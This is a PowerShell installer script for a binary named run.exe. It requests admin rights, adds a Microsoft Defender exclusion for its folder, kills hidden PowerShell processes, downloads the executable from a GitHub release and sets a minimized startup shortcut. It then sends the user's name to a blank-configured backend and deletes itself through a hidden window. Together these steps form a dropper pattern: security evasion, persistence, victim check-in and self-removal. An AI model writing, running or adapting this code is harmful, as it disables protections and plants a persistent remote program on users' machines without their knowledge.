$ErrorActionPreference = "SilentlyContinue"

$BASE_URL = ""
$API_KEY = ""

$scriptPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$installDir = "$env:APPDATA\run"
$runExe = "$installDir\run.exe"
$datFile = "$env:APPDATA\run.dat"
$isUpdate = Test-Path $datFile
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk"

if (-not $isUpdate -and -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process $scriptPath -Verb RunAs
    exit
}

if (-not $isUpdate) {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
}

# kill all instances
Get-Process -Name "run" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Id -ne $PID } | Stop-Process -Force
Start-Sleep -Seconds 2

# cleanup
if (Test-Path $datFile) { Remove-Item $datFile -Force }
if (Test-Path $runExe) { Remove-Item $runExe -Force }

New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/releases/latest/download/run.exe" -OutFile $runExe -UseBasicParsing
if (-not (Test-Path $runExe)) {
    exit
}

# startup
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = $runExe
$Shortcut.Arguments = "--startup"
$Shortcut.WindowStyle = 7
$Shortcut.Save()

# mark installed
$installDir | Out-File $datFile

# register client
$h = @{
    "apikey"        = $API_KEY
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
    "Prefer"        = "resolution=merge-duplicates"
}
try {
    Invoke-RestMethod -Method Post -Uri "$BASE_URL/clients" -Headers $h -Body "{`"username`": `"$env:USERNAME`"}" | Out-Null
}
catch {}

Start-Process $runExe -ArgumentList "--startup"

# self delete
Start-Process powershell -ArgumentList "-Command `"Start-Sleep 5; Remove-Item '$scriptPath' -Force`"" -WindowStyle Hidden